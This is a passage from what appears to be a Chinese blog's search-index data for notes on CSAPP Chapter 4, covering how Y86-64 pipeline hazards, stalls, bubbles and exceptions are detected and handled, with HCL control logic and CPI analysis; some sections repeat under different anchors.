该冒险出现的情况是在下一条指令的译码阶段，上一条指令还没有完成访存 该冒险的处理方式是在访存指令后插入一个 bubble（暂停一个周期），然后再运行下一条指令 处理 ret 该冒险出现的情况是ret指令 PC 的下一条地址是在访存阶段完成，但是后面那条指令还不等到访存写入正确的 PC 就取指了，所以需要在ret后加 3 个 bubble（暂停 3 个周期） 预测错误的分支 该情况出现的原因是获取了错误的指令，那么我们需要在获取正确的指令前插入 bubble，并且将错误的指令改成nop（取消指令） 异常 异常的情况包括遇到了halt停机，取出了错误的指令，后续指令改变了之前的异常状态，我们需要做的是让指令的状态携带在寄存器中，随着指令的运行流过流水线，并且在遇到异常后停机（禁止后面的指令更新程序员可见的状态，并且在异常指令到达写回阶段的时候停止执行） 那么问题来了: 如何发现异常？ 如何插入 bubble？ 如何暂停流水线？暂停有什么用？和插入 bubble 有什么区别？ 如何将指令改为nop？将指令改为nop有什么用？ 如何停机？ 如何处理其他异常？ 8.1.1 加载/使用冒险处理加载/使用冒险发生的时候，情况如下： 该条指令在执行阶段 下一条指令在译码阶段，并且需要读这条指令访存的值 我们的目标是： 该条指令进入访存阶段 下一条指令依然在译码阶段 将值从访存阶段转发到下一条指令的译码阶段 问题是： 如何让该条指令进入访存阶段？ 中间的执行阶段咋办？ 如何让下一条指令保持在译码阶段？ 如何让下一条指令也保持在取指阶段？ 我们的解决办法是： 该条指令照常进行工作，在下一个周期进入访存阶段 在下个周期，在下一条指令和这条指令之间插入一个气泡，填充过执行阶段 让下一条指令暂停在译码阶段（流水线寄存器 D 保持固定） 下下一条指令暂停在取指阶段（流水线寄存器 F 保持固定） 8.1.2 ret指令处理ret指令出现的时候，情况如下： ret指令正在译码阶段 下一条指令正在取指阶段 我们的目标是：等到ret指令进入写回阶段后，下一条指令在进入取指阶段 问题在于：ret指令从译码阶段到写回阶段需要 3 个时钟周期，在这期间如何保持下一条指令一直在取指阶段，且我们无法在取指阶段插入气泡 我们的解决办法是： ret指令正常执行 取指阶段暂停，一直重复取出下一条指令 在ret执行到译码、执行、访存阶段时，将那些指令替换为气泡（nop） 3 个周期结束后继续取下一条指令 8.1.3 预测错误的分支处理分支预测错误时，情况如下： jxx dest指令位于译码阶段 下一条指令位于取指阶段 我们的目标是： 等到jxx dest进入访存阶段后，取下一条指令 其他时候取出的指令作废（包括译码阶段取指、执行阶段取指） 实现的方法是： jxx dest指令正常运作 jxx dest在译码阶段、执行阶段中，处理器取出的指令替换为nop（执行阶段后才替换，因为jxx dest在执行阶段后才检测出错误来） 进入访存阶段后正常取出下一条指令 8.1.4 异常处理对于异常，我们首先采取一个措施：在寄存器中加入stat状态字段，该字段随着指令流过寄存器。我们的目标是：异常前的指令正确执行，异常后的指令对程序可见的状态没有影响。 有 2 处位置会产生异常： 取指，如果指令不合法或者指令地址不合法，会产生异常 访存，如果数据地址不合法，会产生异常 程序状态在 3 个阶段被更新： 执行 访存 写回 我们应对这 3 个阶段的异常采取的措施是： 禁止执行阶段中的指令设置条件码 像访存阶段中插入气泡 暂停写回阶段 ","date":"2024-03-13","objectID":"/ch4/:8:1","series":["15-213"],"tags":null,"title":"CSAPP Chapter 4 - 处理器体系结构","uri":"/ch4/#加载使用冒险处理"},{"categories":["系统入门"],"content":" 8.1 几种特殊情况及其处理几种需要处理的特殊情况包括： 加载/使用冒险： 该冒险出现的情况是在下一条指令的译码阶段，上一条指令还没有完成访存 该冒险的处理方式是在访存指令后插入一个 bubble（暂停一个周期），然后再运行下一条指令 处理 ret 该冒险出现的情况是ret指令 PC 的下一条地址是在访存阶段完成，但是后面那条指令还不等到访存写入正确的 PC 就取指了，所以需要在ret后加 3 个 bubble（暂停 3 个周期） 预测错误的分支 该情况出现的原因是获取了错误的指令，那么我们需要在获取正确的指令前插入 bubble，并且将错误的指令改成nop（取消指令） 异常 异常的情况包括遇到了halt停机，取出了错误的指令，后续指令改变了之前的异常状态，我们需要做的是让指令的状态携带在寄存器中，随着指令的运行流过流水线，并且在遇到异常后停机（禁止后面的指令更新程序员可见的状态，并且在异常指令到达写回阶段的时候停止执行） 那么问题来了: 如何发现异常？ 如何插入 bubble？ 如何暂停流水线？暂停有什么用？和插入 bubble 有什么区别？ 如何将指令改为nop？将指令改为nop有什么用？ 如何停机？ 如何处理其他异常？ 8.1.1 加载/使用冒险处理加载/使用冒险发生的时候，情况如下： 该条指令在执行阶段 下一条指令在译码阶段，并且需要读这条指令访存的值 我们的目标是： 该条指令进入访存阶段 下一条指令依然在译码阶段 将值从访存阶段转发到下一条指令的译码阶段 问题是： 如何让该条指令进入访存阶段？ 中间的执行阶段咋办？ 如何让下一条指令保持在译码阶段？ 如何让下一条指令也保持在取指阶段？ 我们的解决办法是： 该条指令照常进行工作，在下一个周期进入访存阶段 在下个周期，在下一条指令和这条指令之间插入一个气泡，填充过执行阶段 让下一条指令暂停在译码阶段（流水线寄存器 D 保持固定） 下下一条指令暂停在取指阶段（流水线寄存器 F 保持固定） 8.1.2 ret指令处理ret指令出现的时候，情况如下： ret指令正在译码阶段 下一条指令正在取指阶段 我们的目标是：等到ret指令进入写回阶段后，下一条指令在进入取指阶段 问题在于：ret指令从译码阶段到写回阶段需要 3 个时钟周期，在这期间如何保持下一条指令一直在取指阶段，且我们无法在取指阶段插入气泡 我们的解决办法是： ret指令正常执行 取指阶段暂停，一直重复取出下一条指令 在ret执行到译码、执行、访存阶段时，将那些指令替换为气泡（nop） 3 个周期结束后继续取下一条指令 8.1.3 预测错误的分支处理分支预测错误时，情况如下： jxx dest指令位于译码阶段 下一条指令位于取指阶段 我们的目标是： 等到jxx dest进入访存阶段后，取下一条指令 其他时候取出的指令作废（包括译码阶段取指、执行阶段取指） 实现的方法是： jxx dest指令正常运作 jxx dest在译码阶段、执行阶段中，处理器取出的指令替换为nop（执行阶段后才替换，因为jxx dest在执行阶段后才检测出错误来） 进入访存阶段后正常取出下一条指令 8.1.4 异常处理对于异常，我们首先采取一个措施：在寄存器中加入stat状态字段，该字段随着指令流过寄存器。我们的目标是：异常前的指令正确执行，异常后的指令对程序可见的状态没有影响。 有 2 处位置会产生异常： 取指，如果指令不合法或者指令地址不合法，会产生异常 访存，如果数据地址不合法，会产生异常 程序状态在 3 个阶段被更新： 执行 访存 写回 我们应对这 3 个阶段的异常采取的措施是： 禁止执行阶段中的指令设置条件码 像访存阶段中插入气泡 暂停写回阶段 ","date":"2024-03-13","objectID":"/ch4/:8:1","series":["15-213"],"tags":null,"title":"CSAPP Chapter 4 - 处理器体系结构","uri":"/ch4/#ret指令处理"},{"categories":["系统入门"],"content":" 8.1 几种特殊情况及其处理几种需要处理的特殊情况包括： 加载/使用冒险： 该冒险出现的情况是在下一条指令的译码阶段，上一条指令还没有完成访存 该冒险的处理方式是在访存指令后插入一个 bubble（暂停一个周期），然后再运行下一条指令 处理 ret 该冒险出现的情况是ret指令 PC 的下一条地址是在访存阶段完成，但是后面那条指令还不等到访存写入正确的 PC 就取指了，所以需要在ret后加 3 个 bubble（暂停 3 个周期） 预测错误的分支 该情况出现的原因是获取了错误的指令，那么我们需要在获取正确的指令前插入 bubble，并且将错误的指令改成nop（取消指令） 异常 异常的情况包括遇到了halt停机，取出了错误的指令，后续指令改变了之前的异常状态，我们需要做的是让指令的状态携带在寄存器中，随着指令的运行流过流水线，并且在遇到异常后停机（禁止后面的指令更新程序员可见的状态，并且在异常指令到达写回阶段的时候停止执行） 那么问题来了: 如何发现异常？ 如何插入 bubble？ 如何暂停流水线？暂停有什么用？和插入 bubble 有什么区别？ 如何将指令改为nop？将指令改为nop有什么用？ 如何停机？ 如何处理其他异常？ 8.1.1 加载/使用冒险处理加载/使用冒险发生的时候，情况如下： 该条指令在执行阶段 下一条指令在译码阶段，并且需要读这条指令访存的值 我们的目标是： 该条指令进入访存阶段 下一条指令依然在译码阶段 将值从访存阶段转发到下一条指令的译码阶段 问题是： 如何让该条指令进入访存阶段？ 中间的执行阶段咋办？ 如何让下一条指令保持在译码阶段？ 如何让下一条指令也保持在取指阶段？ 我们的解决办法是： 该条指令照常进行工作，在下一个周期进入访存阶段 在下个周期，在下一条指令和这条指令之间插入一个气泡，填充过执行阶段 让下一条指令暂停在译码阶段（流水线寄存器 D 保持固定） 下下一条指令暂停在取指阶段（流水线寄存器 F 保持固定） 8.1.2 ret指令处理ret指令出现的时候，情况如下： ret指令正在译码阶段 下一条指令正在取指阶段 我们的目标是：等到ret指令进入写回阶段后，下一条指令在进入取指阶段 问题在于：ret指令从译码阶段到写回阶段需要 3 个时钟周期，在这期间如何保持下一条指令一直在取指阶段，且我们无法在取指阶段插入气泡 我们的解决办法是： ret指令正常执行 取指阶段暂停，一直重复取出下一条指令 在ret执行到译码、执行、访存阶段时，将那些指令替换为气泡（nop） 3 个周期结束后继续取下一条指令 8.1.3 预测错误的分支处理分支预测错误时，情况如下： jxx dest指令位于译码阶段 下一条指令位于取指阶段 我们的目标是： 等到jxx dest进入访存阶段后，取下一条指令 其他时候取出的指令作废（包括译码阶段取指、执行阶段取指） 实现的方法是： jxx dest指令正常运作 jxx dest在译码阶段、执行阶段中，处理器取出的指令替换为nop（执行阶段后才替换，因为jxx dest在执行阶段后才检测出错误来） 进入访存阶段后正常取出下一条指令 8.1.4 异常处理对于异常，我们首先采取一个措施：在寄存器中加入stat状态字段，该字段随着指令流过寄存器。我们的目标是：异常前的指令正确执行，异常后的指令对程序可见的状态没有影响。 有 2 处位置会产生异常： 取指，如果指令不合法或者指令地址不合法，会产生异常 访存，如果数据地址不合法，会产生异常 程序状态在 3 个阶段被更新： 执行 访存 写回 我们应对这 3 个阶段的异常采取的措施是： 禁止执行阶段中的指令设置条件码 像访存阶段中插入气泡 暂停写回阶段 ","date":"2024-03-13","objectID":"/ch4/:8:1","series":["15-213"],"tags":null,"title":"CSAPP Chapter 4 - 处理器体系结构","uri":"/ch4/#预测错误的分支处理"},{"categories":["系统入门"],"content":" 8.1 几种特殊情况及其处理几种需要处理的特殊情况包括： 加载/使用冒险： 该冒险出现的情况是在下一条指令的译码阶段，上一条指令还没有完成访存 该冒险的处理方式是在访存指令后插入一个 bubble（暂停一个周期），然后再运行下一条指令 处理 ret 该冒险出现的情况是ret指令 PC 的下一条地址是在访存阶段完成，但是后面那条指令还不等到访存写入正确的 PC 就取指了，所以需要在ret后加 3 个 bubble（暂停 3 个周期） 预测错误的分支 该情况出现的原因是获取了错误的指令，那么我们需要在获取正确的指令前插入 bubble，并且将错误的指令改成nop（取消指令） 异常 异常的情况包括遇到了halt停机，取出了错误的指令，后续指令改变了之前的异常状态，我们需要做的是让指令的状态携带在寄存器中，随着指令的运行流过流水线，并且在遇到异常后停机（禁止后面的指令更新程序员可见的状态，并且在异常指令到达写回阶段的时候停止执行） 那么问题来了: 如何发现异常？ 如何插入 bubble？ 如何暂停流水线？暂停有什么用？和插入 bubble 有什么区别？ 如何将指令改为nop？将指令改为nop有什么用？ 如何停机？ 如何处理其他异常？ 8.1.1 加载/使用冒险处理加载/使用冒险发生的时候，情况如下： 该条指令在执行阶段 下一条指令在译码阶段，并且需要读这条指令访存的值 我们的目标是： 该条指令进入访存阶段 下一条指令依然在译码阶段 将值从访存阶段转发到下一条指令的译码阶段 问题是： 如何让该条指令进入访存阶段？ 中间的执行阶段咋办？ 如何让下一条指令保持在译码阶段？ 如何让下一条指令也保持在取指阶段？ 我们的解决办法是： 该条指令照常进行工作，在下一个周期进入访存阶段 在下个周期，在下一条指令和这条指令之间插入一个气泡，填充过执行阶段 让下一条指令暂停在译码阶段（流水线寄存器 D 保持固定） 下下一条指令暂停在取指阶段（流水线寄存器 F 保持固定） 8.1.2 ret指令处理ret指令出现的时候，情况如下： ret指令正在译码阶段 下一条指令正在取指阶段 我们的目标是：等到ret指令进入写回阶段后，下一条指令在进入取指阶段 问题在于：ret指令从译码阶段到写回阶段需要 3 个时钟周期，在这期间如何保持下一条指令一直在取指阶段，且我们无法在取指阶段插入气泡 我们的解决办法是： ret指令正常执行 取指阶段暂停，一直重复取出下一条指令 在ret执行到译码、执行、访存阶段时，将那些指令替换为气泡（nop） 3 个周期结束后继续取下一条指令 8.1.3 预测错误的分支处理分支预测错误时，情况如下： jxx dest指令位于译码阶段 下一条指令位于取指阶段 我们的目标是： 等到jxx dest进入访存阶段后，取下一条指令 其他时候取出的指令作废（包括译码阶段取指、执行阶段取指） 实现的方法是： jxx dest指令正常运作 jxx dest在译码阶段、执行阶段中，处理器取出的指令替换为nop（执行阶段后才替换，因为jxx dest在执行阶段后才检测出错误来） 进入访存阶段后正常取出下一条指令 8.1.4 异常处理对于异常，我们首先采取一个措施：在寄存器中加入stat状态字段，该字段随着指令流过寄存器。我们的目标是：异常前的指令正确执行，异常后的指令对程序可见的状态没有影响。 有 2 处位置会产生异常： 取指，如果指令不合法或者指令地址不合法，会产生异常 访存，如果数据地址不合法，会产生异常 程序状态在 3 个阶段被更新： 执行 访存 写回 我们应对这 3 个阶段的异常采取的措施是： 禁止执行阶段中的指令设置条件码 像访存阶段中插入气泡 暂停写回阶段 ","date":"2024-03-13","objectID":"/ch4/:8:1","series":["15-213"],"tags":null,"title":"CSAPP Chapter 4 - 处理器体系结构","uri":"/ch4/#异常处理-1"},{"categories":["系统入门"],"content":" 8.2 发现特殊控制条件这里有几个问题： 什么时候发现？ 发现以后怎么做？ 几种情况： 加载/使用冒险 该条指令在执行阶段；下一条指令在译码阶段，并且需要读这条指令访存的值； E_icode in {IMRMOVL,IPOPL} \u0026\u0026 E_dstM in {d_srcA,d_srcB} 处理ret指令 等待ret指令经过译码，执行，访存阶段，进入写回阶段 IRET in {D_icode, E_icode, M_icode} 预测错误的分支 该指令为jxx dest并且执行阶段Cnd为false(不跳转) E_icode == IJXX \u0026\u0026 !e_Cnd 异常情况 检查访存和写回阶段的指令状态值，就能发现异常指令 m_stat in {SADR,SINS,SHLT} || W_stat in {SADR,SINS,SHLT} ","date":"2024-03-13","objectID":"/ch4/:8:2","series":["15-213"],"tags":null,"title":"CSAPP Chapter 4 - 处理器体系结构","uri":"/ch4/#发现特殊控制条件"},{"categories":["系统入门"],"content":" 8.3 流水线控制机制流水线的控制机制包括: 暂停流水线 插入气泡（将下一条指令替换为nop） 实现方式：对基本时钟寄存器进行一点小扩展，信号的设置决定在时钟上升沿如何更新流水线寄存器 正常操作，两个输入都为 0，寄存器加载输入作为新状态 暂停信号为 1，禁止更新状态 气泡信号为 1，寄存器设置成某个固定的复位配置，得到一个等效于nop指令的状态 气泡和暂停都为 1，表明发生错误 ","date":"2024-03-13","objectID":"/ch4/:8:3","series":["15-213"],"tags":null,"title":"CSAPP Chapter 4 - 处理器体系结构","uri":"/ch4/#流水线控制机制"},{"categories":["系统入门"],"content":" 8.4 流水线三种特殊情况下应该采取的行动 条件 F D E M W 处理ret 暂停 气泡 正常 正常 正常 加载/使用冒险 暂停 暂停 气泡 正常 正常 预测错误的分支 正常 气泡 气泡 正常 正常 ","date":"2024-03-13","objectID":"/ch4/:8:4","series":["15-213"],"tags":null,"title":"CSAPP Chapter 4 - 处理器体系结构","uri":"/ch4/#流水线三种特殊情况下应该采取的行动"},{"categories":["系统入门"],"content":" 8.5 控制条件的组合 8.5.1 组合 A：JXX Dest（执行阶段) + ret 指令(译码阶段)冲突发生条件： jxx dest在执行阶段计算出Cnd，发现跳转分支错误，于是选择在下一个时钟周期取消后面的 2 条指令 ret指令进入到译码阶段，下一个周期进入执行阶段 结果：ret指令被取消掉 但是ret指令进入执行阶段后，会让它后面的三条指令变成气泡（为了让ret顺利的度过访存阶段，取出下一条 PC），虽然ret被取消了，但是后面的 3 条指令还是暂停了。 最终方案： jxx dest进入到访存阶段 进入到执行阶段的ret变成气泡 进入执行阶段的ret的后面一条指令（译码阶段）变成气泡 进入取指阶段的那条指令暂停，一直重复取指 8.5.2 组合 B：加载/使用冒险 + ret 指令冲突发生条件： 执行阶段存在一条访存指令（mrmovq或popq，推测多半是popq） 译码阶段是ret指令，刚好用到前面所用到的寄存器 由于ret指令在译码阶段所用到的寄存器是%rsp，所以推测前面的那条指令是popq %rsp。那么也就是说： popq %rsp位于执行阶段 ret位于译码阶段 对于popq %rsp造成的加载/使用冒险，当popq %rsp进入访存阶段时，ret进入执行阶段。为了应对加载/使用冒险，我们会在执行阶段插入一个气泡，将访存的结果转发到下一条指令的译码阶段，译码阶段和取指阶段暂停。 然而，当ret在译码阶段时会被检测到，当其进入执行阶段时，译码阶段的指令被转化为气泡，而取指阶段的指令暂停。 那么综合起来时间线如下： popq %rsp位于执行阶段，加载/使用冒险被探测到；同时ret位于译码阶段，ret的处理被探测到 popq %rsp进入访存阶段 -\u003e 在执行阶段插入一个气泡，访存的结果被转发到下一条指令的译码阶段，译码阶段和取指阶段暂停；ret进入执行阶段 -\u003e ret变成气泡，译码阶段变成气泡，取指阶段暂停； 总结如下： 执行阶段指令变成了气泡 取指阶段暂停 那么冲突来了：译码阶段的指令到底是变成气泡呢？还是暂停呢？ 在 PIPE 的实现中，这里是存在问题的，它会在时钟里把气泡和暂停信号都设置为 1，我们希望它只采取针对加载/使用冒险的动作，处理ret指令的动作应该推迟一个周期。 ","date":"2024-03-13","objectID":"/ch4/:8:5","series":["15-213"],"tags":null,"title":"CSAPP Chapter 4 - 处理器体系结构","uri":"/ch4/#控制条件的组合"},{"categories":["系统入门"],"content":" 8.5 控制条件的组合 8.5.1 组合 A：JXX Dest（执行阶段) + ret 指令(译码阶段)冲突发生条件： jxx dest在执行阶段计算出Cnd，发现跳转分支错误，于是选择在下一个时钟周期取消后面的 2 条指令 ret指令进入到译码阶段，下一个周期进入执行阶段 结果：ret指令被取消掉 但是ret指令进入执行阶段后，会让它后面的三条指令变成气泡（为了让ret顺利的度过访存阶段，取出下一条 PC），虽然ret被取消了，但是后面的 3 条指令还是暂停了。 最终方案： jxx dest进入到访存阶段 进入到执行阶段的ret变成气泡 进入执行阶段的ret的后面一条指令（译码阶段）变成气泡 进入取指阶段的那条指令暂停，一直重复取指 8.5.2 组合 B：加载/使用冒险 + ret 指令冲突发生条件： 执行阶段存在一条访存指令（mrmovq或popq，推测多半是popq） 译码阶段是ret指令，刚好用到前面所用到的寄存器 由于ret指令在译码阶段所用到的寄存器是%rsp，所以推测前面的那条指令是popq %rsp。那么也就是说： popq %rsp位于执行阶段 ret位于译码阶段 对于popq %rsp造成的加载/使用冒险，当popq %rsp进入访存阶段时，ret进入执行阶段。为了应对加载/使用冒险，我们会在执行阶段插入一个气泡，将访存的结果转发到下一条指令的译码阶段，译码阶段和取指阶段暂停。 然而，当ret在译码阶段时会被检测到，当其进入执行阶段时，译码阶段的指令被转化为气泡，而取指阶段的指令暂停。 那么综合起来时间线如下： popq %rsp位于执行阶段，加载/使用冒险被探测到；同时ret位于译码阶段，ret的处理被探测到 popq %rsp进入访存阶段 -\u003e 在执行阶段插入一个气泡，访存的结果被转发到下一条指令的译码阶段，译码阶段和取指阶段暂停；ret进入执行阶段 -\u003e ret变成气泡，译码阶段变成气泡，取指阶段暂停； 总结如下： 执行阶段指令变成了气泡 取指阶段暂停 那么冲突来了：译码阶段的指令到底是变成气泡呢？还是暂停呢？ 在 PIPE 的实现中，这里是存在问题的，它会在时钟里把气泡和暂停信号都设置为 1，我们希望它只采取针对加载/使用冒险的动作，处理ret指令的动作应该推迟一个周期。 ","date":"2024-03-13","objectID":"/ch4/:8:5","series":["15-213"],"tags":null,"title":"CSAPP Chapter 4 - 处理器体系结构","uri":"/ch4/#组合-ajxx-dest执行阶段--ret-指令译码阶段"},{"categories":["系统入门"],"content":" 8.5 控制条件的组合 8.5.1 组合 A：JXX Dest（执行阶段) + ret 指令(译码阶段)冲突发生条件： jxx dest在执行阶段计算出Cnd，发现跳转分支错误，于是选择在下一个时钟周期取消后面的 2 条指令 ret指令进入到译码阶段，下一个周期进入执行阶段 结果：ret指令被取消掉 但是ret指令进入执行阶段后，会让它后面的三条指令变成气泡（为了让ret顺利的度过访存阶段，取出下一条 PC），虽然ret被取消了，但是后面的 3 条指令还是暂停了。 最终方案： jxx dest进入到访存阶段 进入到执行阶段的ret变成气泡 进入执行阶段的ret的后面一条指令（译码阶段）变成气泡 进入取指阶段的那条指令暂停，一直重复取指 8.5.2 组合 B：加载/使用冒险 + ret 指令冲突发生条件： 执行阶段存在一条访存指令（mrmovq或popq，推测多半是popq） 译码阶段是ret指令，刚好用到前面所用到的寄存器 由于ret指令在译码阶段所用到的寄存器是%rsp，所以推测前面的那条指令是popq %rsp。那么也就是说： popq %rsp位于执行阶段 ret位于译码阶段 对于popq %rsp造成的加载/使用冒险，当popq %rsp进入访存阶段时，ret进入执行阶段。为了应对加载/使用冒险，我们会在执行阶段插入一个气泡，将访存的结果转发到下一条指令的译码阶段，译码阶段和取指阶段暂停。 然而，当ret在译码阶段时会被检测到，当其进入执行阶段时，译码阶段的指令被转化为气泡，而取指阶段的指令暂停。 那么综合起来时间线如下： popq %rsp位于执行阶段，加载/使用冒险被探测到；同时ret位于译码阶段，ret的处理被探测到 popq %rsp进入访存阶段 -\u003e 在执行阶段插入一个气泡，访存的结果被转发到下一条指令的译码阶段，译码阶段和取指阶段暂停；ret进入执行阶段 -\u003e ret变成气泡，译码阶段变成气泡，取指阶段暂停； 总结如下： 执行阶段指令变成了气泡 取指阶段暂停 那么冲突来了：译码阶段的指令到底是变成气泡呢？还是暂停呢？ 在 PIPE 的实现中，这里是存在问题的，它会在时钟里把气泡和暂停信号都设置为 1，我们希望它只采取针对加载/使用冒险的动作，处理ret指令的动作应该推迟一个周期。 ","date":"2024-03-13","objectID":"/ch4/:8:5","series":["15-213"],"tags":null,"title":"CSAPP Chapter 4 - 处理器体系结构","uri":"/ch4/#组合-b加载使用冒险--ret-指令"},{"categories":["系统入门"],"content":" 8.6 控制逻辑实现 复习一下几种控制冒险的发生条件： 加载/使用冒险 该条指令在执行阶段；下一条指令在译码阶段，并且需要读这条指令访存的值； E_icode in {IMRMOVL,IPOPL} \u0026\u0026 E_dstM in {d_srcA,d_srcB} 处理ret指令 等待ret指令经过译码，执行，访存阶段，进入写回阶段 IRET in {D_icode, E_icode, M_icode} 预测错误的分支 该指令为jxx dest并且执行阶段Cnd为false(不跳转) E_icode == IJXX \u0026\u0026 !e_Cnd 异常情况 检查访存和写回阶段的指令状态值，就能发现异常指令 m_stat in {SADR,SINS,SHLT} || W_stat in {SADR,SINS,SHLT} 要实现的控制逻辑如下： F_stall 取指寄存器暂停主要存在于以下几种情况： 加载/使用冒险 处理ret D_stall 译码寄存器暂停主要存在于加载/使用冒险 D_bubble 译码寄存器插入气泡主要存在于以下几种情况： 处理ret 预测错误的分支 此外，如前面组合 B 分析的，遇到加载/使用冒险ret指令组合的，不应该插入气泡 E_bubble 执行阶段插入气泡主要存在于以下几种情况： 加载/使用冒险 预测错误的分支 set_cc 条件码的设置 M_bubble 访存阶段寄存器插入气泡主要存在于异常发生时 W_stall 写回阶段寄存器暂停主要存在于异常发生时 其他的流水线控制信号都设置为 0 各情况下的信号描述，和前文各控制冒险的探测条件相同。比如取指寄存器的暂停主要存在于加载/使用冒险和ret指令，那么其发生条件就是加载/使用冒险和ret指令的发生条件相或。 例如，F_stall的发生条件hcl描述如下： hcl bool F_stall = [ # 加载/使用冒险的条件 E_icode in {IMRMOVQ,IPOPQ} \u0026\u0026 E_dstM in {d_srcA, d_srcB} || # ret指令通过流水线时暂停 IRET in {D_icode, E_icode, M_icode}; ]; D_bubble的发生条件hcl描述如下： hcl bool D_bubble = [ # 预测错误的分支 (E_icode == IJXX \u0026\u0026 !e_Cnd) || # ret指令通过流水线时暂停 IRET in {D_icode, E_icode, M_icode} \u0026\u0026 # 但是ret指令和加载/使用冒险不能同时出现 !(E_icode in {IMRMOVQ, IPOPQ} \u0026\u0026 E_dstM in {d_srcA,d_srcB}) ]; ","date":"2024-03-13","objectID":"/ch4/:8:6","series":["15-213"],"tags":null,"title":"CSAPP Chapter 4 - 处理器体系结构","uri":"/ch4/#控制逻辑实现"},{"categories":["系统入门"],"content":" 8.7 两种测试方法 编写测试程序 基础指令测试，具有不同的源和目的寄存器 跳转和函数调用指令测试，具有不同的是否选择分支的组合 条件传送指令测试，具有不同控制组合 数据冒险可能性测试，具有不同的源和目的组合，其中插入多种nop指令 不同数据冒险的控制组合 导致异常的指令和其后可能改变程序员可见状态的指令组合 使用形式化验证 使用归纳法，表明两个处理器之间在一个周期到一个周期的基础上都是一致的 使用符号方法来推导硬件 能够证明 SEQ 和 PIPE 行为完全相同，但是不能保证都实现了完备的 Y86-64 体系结构 可以使用 Verilog 语言来描述硬件，然后使用各种模拟和形式化工具进行测试验证，对设计有信心后，可以使用逻辑合成工具将设计翻译成实际的逻辑电路，最后下载到可编程门阵列（FPGA）上，运行实际的 Y86-64 程序。 ","date":"2024-03-13","objectID":"/ch4/:8:7","series":["15-213"],"tags":null,"title":"CSAPP Chapter 4 - 处理器体系结构","uri":"/ch4/#两种测试方法"},{"categories":["系统入门"],"content":" 9 性能分析流水线中的暂停和气泡。都会导致流水线无法实现一个周期一条指令的目标，这里主要通过插入气泡的频率和个数来衡量效率的损失，因为插入气泡会导致未使用的流水线周期。不同指令插入气泡的情况如下： 加载/使用冒险：插入 1 个气泡 跳转指令：插入 2 个气泡 ret指令：插入 3 个气泡 我们的衡量指标是 PIPE 执行一条指令所需要的时钟周期数，也称为 CPI (Cycles Per Instructions), 该值是吞吐量的倒数。 我们的测试方法是在处理器上运行某个基准程序，其中计算 CPI 的公式如下： $$ CPI = \\frac{C_{i}+C_{b}}{C_{i}} = 1 + \\frac{C_{b}}{C_{i}} $$ 其中$C_{i}$是执行的指令的个数，$C_{b}$是执行这些指令期间插入气泡的个数。如果没有气泡的话，应该是 1 个周期 1 条指令。但是有了气泡以后，就需要添加气泡所耗费的时钟周期（1 个气泡 1 个时钟周期）。因此 $$ CPI = 1 + (lp + mp + rp) $$ 我们可以将这个处罚项分解成 3 个部分： 加载/使用冒险带来的气泡平均数 lp 跳转指令所带来的气泡平均数 mp ret指令所带来的气泡平均数 rp 要估算每个冒险产生的气泡平均数，需要： 计算每条指令发生的频率 执行该指令时该冒险出现的频率 每次冒险产生的气泡个数 降低 CPI 的方法主要集中在预测错误的分支 ","date":"2024-03-13","objectID":"/ch4/:9:0","series":["15-213"],"tags":null,"title":"CSAPP Chapter 4 - 处理器体系结构","uri":"/ch4/#性能分析"},{"categories":["系统入门"],"content":" 10 未完成的工作","date":"2024-03-13","objectID":"/ch4/:10:0","series":["15-213"],"tags":null,"title":"CSAPP Chapter 4 - 处理器体系结构","uri":"/ch4/#未完成的工作"},{"categories":["系统入门"],"content":" 10.1 多周期指令复杂的指令需要多个周期才能完成。为了实现这些指令，我们需要： 额外的硬件 协调这些指令的处理和正常流水线的机制 实现有几种方法： 简单的扩展执行阶段逻辑的功能：添加整数和浮点运算单元，在执行阶段多逗留，暂停后面的阶段（效率低下） 采用独立于主流水线的特殊硬件功能单元：译码阶段可以发射指令到特殊单元，主流水线继续执行后面的指令（并发执行） 不同单元的操作必须同步以避免出错：使用各种形式的转发 ","date":"2024-03-13","objectID":"/ch4/:10:1","series":["15-213"],"tags":null,"title":"CSAPP Chapter 4 - 处理器体系结构","uri":"/ch4/#多周期指令"},{"categories":["系统入门"],"content":" 10.2 与存储系统的接口在对 PIPE 进行分析的时候，我们忽略了自我修改代码造成的可能冒险。也就是一个指令写，后面又要读。 但是，我们对存储器的引用是以虚拟地址的形式进行的，这要求在执行实际的读或写之前，要将虚拟地址翻译成物理地址，但是这需要很多个周期。而且，要读的数据可能在磁盘上，需要上百万个时钟周期才能完成。 而后我们会了解到，处理器的存储系统是由多种硬件存储器和管理虚拟内存的操作系统软件共同组成的。存储系统被组织成一个层次结构。最靠近处理器的一层是高速缓冲存储器(cache)。 一个典型的处理器有两个第一层高速缓存：一个用于读指令，一个用于读/写数据。此外，还有一种 cache，叫做翻译后备缓冲器(Translation Look-aside Buffer, 也叫 TLB)，它提供了从虚拟地址到物理地址的快速翻译。存储系统的快速访问是 TLB 和 cache 的共同作用，可能实现一个时钟周期内读或者写数据。 但是高速缓存也有不命中的可能。 在较高层的存储系统中找到不命中的数据需要 3-20 个时钟周期。同时，流水线会简单暂停，将指令保持在取指或访问阶段，直到高速缓冲存储器能够执行读或写操作。 不命中的数据在磁盘上，此时硬件产生缺页异常信号，同其他异常一样，这个异常会导致处理器调用操作系统的异常处理程序代码。完成后操作系统返回到原来的程序，导致缺页的指令会被重新执行。因为访问磁盘需要上百万个时钟周期，因此缺页处理成顺序执行的上百个时钟周期数可以忽略不计。 总结： 用暂停处理短时间的高速缓存不命中 利用异常处理来处理长时间的缺页 微处理器结构发展：五级流水线 -\u003e 超标量操作 —\u003e 乱序发射/多核处理器等等 ","date":"2024-03-13","objectID":"/ch4/:10:2","series":["15-213"],"tags":null,"title":"CSAPP Chapter 4 - 处理器体系结构","uri":"/ch4/#与存储系统的接口"},{"categories":["系统入门"],"content":" 11 HCL 代码学习PIPE 处理器的 HCL 代码见此 HCL 是一种硬件描述语言，其含有对 Boolean 表达式的描述和一部分选择逻辑的描述，相比真正的 HDL 语言，还差了很多东西。HDL 语言主要通过一个叫HCL2C的程序转化成 C 语言程序，然后通过和其他一部分 C 程序相链接，形成最后的模拟器。 HCL 有两种信号： bool，翻译成 C 语言后是int类型，只有 0 和 1 两种值 int，翻译成 C 语言后是long long int类型 ","date":"2024-03-13","objectID":"/ch4/:11:0","series":["15-213"],"tags":null,"title":"CSAPP Chapter 4 - 处理器体系结构","uri":"/ch4/#hcl-代码学习"},{"categories":["系统入门"],"content":" 11.1 HCL 信号说明信号的声明方式如下： hcl boolsig name ’C-expr’ intsig name ’C-expr’ 